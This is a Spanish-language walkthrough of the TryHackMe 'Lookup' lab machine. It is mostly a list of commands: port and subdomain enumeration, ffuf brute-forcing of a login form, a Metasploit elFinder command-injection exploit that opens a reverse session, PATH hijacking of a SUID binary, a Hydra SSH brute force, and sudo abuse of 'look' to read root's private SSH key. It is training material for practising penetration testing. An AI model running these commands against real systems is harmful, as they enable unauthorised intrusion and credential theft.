---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - HTTP
  - FuzzingWeb
  - Searchsploit
  - MSF
  - Sudo
  - Hijacking
  - Hydra
  - SSH
  - PrivilegeEscalation
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Searchsploit|Searchsploit]]
	- [[#Explotación#MSFconsole|MSFconsole]]
	- [[#Explotación#SUID - Movimiento lateral|SUID - Movimiento lateral]]
		- [[#SUID - Movimiento lateral#Hydra|Hydra]]
		- [[#SUID - Movimiento lateral#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]
		- [[#Escalada de Privilegios#SSH|SSH]]

---
# Resolviendo la máquina Lookup

>En esta publicación, comparto cómo resolví la máquina **Lookup** de [TryHackMe](https://tryhackme.com/room/lookup).

---
## Enumeración
### Ping

`ping -c 1 10.10.245.109`

![[Pasted image 20250810094614.png]]

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.245.109 -oG allPorts`

![[Pasted image 20250810094705.png]]

`nmap -p22,80 -sCV 10.10.245.109 -oN targeted`

![[Pasted image 20250810094722.png]]
### HTTP

`http://10.10.245.109`

`echo "10.10.245.109 lookup.thm" >> /etc/hosts`

![[Pasted image 20250810094946.png]]

![[Pasted image 20250810095141.png]]

![[Pasted image 20250810095159.png]]
#### Fuzzing Web

`ffuf -u https://10.10.245.109/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lookup.thm" -fs 4605`

![[Pasted image 20250810095042.png]]

`dirb http://lookup.thm/`

![[Pasted image 20250810095101.png]]

`ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=test' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100`

![[Pasted image 20250810095237.png]]

Se encuentran los usuarios: `admin` y `jose`.

Se procede a descubrir la contraseña del usuario `jose`.

`ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100`

![[Pasted image 20250810095529.png]]

Se inicia sesión en el portal.

![[Pasted image 20250810095643.png]]

Se visualizan todos los archivos, pero no se encuentra nada.

![[Pasted image 20250810095806.png]]

---
## Explotación
### Searchsploit

`searchsploit elFinder 2.1.47`

![[Pasted image 20250810095945.png]]
### MSFconsole

`msfconsole`

`exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`

```bash
search elfinder
use 4 | use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
show options
set RHOSTS files.lookup.thm
set LHOST 10.8.184.124
exploit
```

![[Pasted image 20250810100245.png]]

`sysinfo`

![[Pasted image 20250810100332.png]]

`getuid`

![[Pasted image 20250810100347.png]]

`shell`

`/bin/bash -i`
### SUID - Movimiento lateral

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250810100501.png]]

`/usr/sbin/pwm`

![[Pasted image 20250810103147.png]]

`id`

![[Pasted image 20250810100646.png]]

`cd /tmp`

`echo '#!/bin/bash' > id`

`echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id`

`echo $PATH`

![[Pasted image 20250810101308.png]]

`PATH=/tmp:$PATH`

`/usr/sbin/pwm`

![[Pasted image 20250810101843.png]]

Se almacena la información en un archivo llamado: `passwords.txt`.
#### Hydra

Se realiza fuerza bruta.

`hydra -l think -P passwords.txt ssh://10.10.245.109`

![[Pasted image 20250810101958.png]]

Se encuentra la contraseña del usuario `think`.
#### SSH

`ssh think@10.10.245.109`

![[Pasted image 20250810102058.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250810102207.png]]

Se encuentra el binario: `/usr/bin/look`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/look/#suid).

![[Pasted image 20250810102301.png]]

`sudo /usr/bin/look '' /root/.ssh/id_rsa`

![[Pasted image 20250810102816.png]]

Se crea un archivo llamado: `id_rsa` y se copia toda la contraseña.

`vim id_rsa`

`chmod 600 id_rsa`
#### SSH

`ssh -i id_rsa root@10.10.245.109`

![[Pasted image 20250810103057.png]]

---





